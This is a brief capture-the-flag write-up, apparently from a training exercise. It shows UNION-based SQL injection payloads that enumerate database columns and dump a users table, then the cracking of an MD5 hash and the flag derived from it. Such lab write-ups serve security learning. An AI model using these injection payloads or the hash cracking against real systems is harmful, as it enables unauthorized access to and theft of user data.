first use this to get all collumns of all tables:
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns

and look for "users" (Ctrl+F)

Then let's get Commentaire and first_name from table "users"
1 AND 1=2 UNION SELECT first_name, Commentaire FROM users

The "Commentaire" column tells us : "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
Let's have a look to the "countersign" column : 5ff9d0165b4f92b14994e5c685cdce28

This seems like a md5 encoded string so let's decode it => This give us "FortyTwo" !

So now let's follow Commentaire's instructions : Lower it (fortytwo) and then Sha256 on it : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
This is our flag !